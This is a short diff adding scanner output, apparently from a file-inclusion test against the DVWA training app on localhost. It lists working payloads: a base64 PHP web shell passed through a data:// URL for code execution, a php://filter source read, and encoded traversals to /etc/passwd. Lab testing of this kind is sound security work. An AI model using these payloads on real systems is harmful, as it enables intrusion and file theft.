@@ -1,0 +1,6 @@
+[1m[32m[+][0m Remote code execution (RCE) found with http://localhost/DVWA/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=&cmd=id
+[1m[32m[+][0m Files can be retrieved with php filter like so (encoded in base64) http://localhost/DVWA/vulnerabilities/fi/?page=php%3A//filter/read%3Dconvert.base64-encode/resource%3Dindex.php
+[1m[32m[+][0m Directory traversal found with http://localhost/DVWA/vulnerabilities/fi/?page=%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+[1m[32m[+][0m Directory traversal found with http://localhost/DVWA/vulnerabilities/fi/?page=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
+[1m[32m[+][0m Directory traversal found with http://localhost/DVWA/vulnerabilities/fi/?page=%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2Fetc%2Fpasswd
+[1m[32m[+][0m Directory traversal found with http://localhost/DVWA/vulnerabilities/fi/?page=%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2Fetc%2Fpasswd
